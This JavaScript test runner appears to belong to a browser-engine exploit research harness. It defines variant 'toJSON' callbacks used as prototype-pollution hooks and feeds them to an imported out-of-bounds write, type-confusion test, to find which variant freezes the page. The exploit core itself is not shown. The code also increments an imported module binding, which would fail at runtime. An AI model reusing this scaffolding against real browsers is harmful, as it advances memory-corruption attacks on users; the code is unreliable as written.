// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { executePPThenOOBWriteTest, globalCallCount_toJSON } from './testJsonTypeConfusionUAFSpeculative.mjs';
import { OOB_CONFIG } from '../config.mjs'; // Importado para OOB_CONFIG
import { toHex } from '../utils.mjs'; // Importar toHex se usado nas funções toJSON

const ppKeyConst = 'toJSON';

// COPIE AQUI A SUA FUNÇÃO originalFreezingPollutedToJSON que estava causando o congelamento
// e vamos chamá-la de toJSON_A_OriginalCongelante
function toJSON_A_OriginalCongelante() {
    const FNAME_toJSON = "originalFreezingToJSON_InTest";
    globalCallCount_toJSON++;
    if (globalCallCount_toJSON === 1) {
        document.title = `toJSON Call ${globalCallCount_toJSON} (OriginalCongelante)`;
    }

    const currentOperationThis = this;
    logS3(`[${ppKeyConst} Poluído - OriginalCongelante] Chamada ${globalCallCount_toJSON}!`, "vuln", FNAME_toJSON);
    // ... (resto da sua lógica original "v2 - Refinado" que congela, incluindo DataView, slice, etc.)
    // Para este exemplo, vou manter a estrutura que usei antes para V1,
    // certifique-se que esta é a que CONGELA para você.
    logS3(`  [CALL ${globalCallCount_toJSON}] typeof this: ${typeof currentOperationThis}`, "info", FNAME_toJSON);
    try {
        logS3(`  [CALL ${globalCallCount_toJSON}] this.constructor.name: ${currentOperationThis.constructor ? currentOperationThis.constructor.name : 'N/A'}`, "info", FNAME_toJSON);
    } catch (e) { /*...*/ }

    let details = { byteLength: "N/A", first_dword: "N/A", slice_exists: "N/A" };
    try {
        details.byteLength = currentOperationThis.byteLength;
        // Bloco DataView (presente nesta variante original)
        if (currentOperationThis && typeof currentOperationThis.byteLength === 'number' && currentOperationThis.byteLength >= 4 && (currentOperationThis instanceof ArrayBuffer || (currentOperationThis.buffer instanceof ArrayBuffer && currentOperationThis.byteOffset !== undefined))) {
            let bufferToView = (currentOperationThis instanceof ArrayBuffer) ? currentOperationThis : currentOperationThis.buffer;
            let offsetInView = (currentOperationThis instanceof ArrayBuffer) ? 0 : currentOperationThis.byteOffset;
            if (bufferToView.byteLength >= offsetInView + 4) {
               details.first_dword = new DataView(bufferToView, offsetInView, 4).getUint32(0, true);
            }
        }
        details.slice_exists = (typeof currentOperationThis.slice === 'function');
        logS3(`  [CALL ${globalCallCount_toJSON}] Detalhes: byteLength=${details.byteLength}, 1stDword=${toHex(details.first_dword)}, slice_exists=${details.slice_exists}`, "info", FNAME_toJSON);
        return { toJSON_executed_A: true, details_byteLength: details.byteLength };
    } catch (e) {
        logS3(`  [${ppKeyConst} Poluído - A] ${FNAME_toJSON} ERRO: ${e.message}`, "critical");
        document.title = `ERRO toJSON Call ${globalCallCount_toJSON} (A)`;
        return { toJSON_error_A: true, message: e.message };
    }
}

// Variante B: Sem a parte do DataView e first_dword
function toJSON_B_NoDataView() {
    const FNAME_toJSON = "toJSON_NoDataView_InTest";
    globalCallCount_toJSON++;
    if (globalCallCount_toJSON === 1) {
        document.title = `toJSON Call ${globalCallCount_toJSON} (NoDataView)`;
    }
    const currentOperationThis = this;
    logS3(`[${ppKeyConst} Poluído - NoDataView] Chamada ${globalCallCount_toJSON}!`, "vuln", FNAME_toJSON);
    logS3(`  [CALL ${globalCallCount_toJSON}] typeof this: ${typeof currentOperationThis}`, "info", FNAME_toJSON);
    try {
        logS3(`  [CALL ${globalCallCount_toJSON}] this.constructor.name: ${currentOperationThis.constructor ? currentOperationThis.constructor.name : 'N/A'}`, "info", FNAME_toJSON);
    } catch (e) { /*...*/ }

    let details = { byteLength: "N/A", slice_exists: "N/A" };
    try {
        details.byteLength = currentOperationThis.byteLength; // Mantém byteLength
        details.slice_exists = (typeof currentOperationThis.slice === 'function'); // Mantém slice check
        logS3(`  [CALL ${globalCallCount_toJSON}] Detalhes (NoDataView): byteLength=${details.byteLength}, slice_exists=${details.slice_exists}`, "info", FNAME_toJSON);
        return { toJSON_executed_B: true, details_byteLength: details.byteLength };
    } catch (e) {
        logS3(`  [${ppKeyConst} Poluído - B] ${FNAME_toJSON} ERRO: ${e.message}`, "critical");
        document.title = `ERRO toJSON Call ${globalCallCount_toJSON} (B)`;
        return { toJSON_error_B: true, message: e.message };
    }
}


async function runSimplificationStepByStep() {
    const FNAME_RUNNER = "runSimplificationStepByStep";
    logS3(`==== INICIANDO Simplificação Passo a Passo do toJSON Congelante ====`, 'test', FNAME_RUNNER);

    const tests = [
        { desc: "A_OriginalCongelante", func: toJSON_A_OriginalCongelante },
        { desc: "B_NoDataView", func: toJSON_B_NoDataView },
        // Adicionaremos mais variantes aqui nos próximos passos
    ];

    for (const test of tests) {
        logS3(`\n--- Executando com toJSON Lógica: ${test.desc} ---`, 'subtest', FNAME_RUNNER);
        // A função executePPThenOOBWriteTest já foi definida em testJsonTypeConfusionUAFSpeculative.mjs
        // e aceita a lógica toJSON como parâmetro.
        await executePPThenOOBWriteTest(test.desc, test.func);
        await PAUSE_S3(MEDIUM_PAUSE_S3); 
        
        // Verifique o document.title aqui manualmente ou adicione um log dele se não congelar.
        logS3(`   Título da página após teste ${test.desc}: ${document.title}`, "info");
    }

    logS3(`==== Simplificação Passo a Passo do toJSON CONCLUÍDA (Verificar qual congelou) ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_SimplifyToJSONFreeze';
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== INICIANDO Script 3: Simplificação de toJSON para Analisar Congelamento ====`,'test', FNAME);
    document.title = "Iniciando Script 3 - Simplificação toJSON";
    
    await runSimplificationStepByStep();
    
    logS3(`\n==== Script 3 CONCLUÍDO (Simplificação de toJSON) ====`,'test', FNAME);
    if (runBtn) runBtn.disabled = false;
}
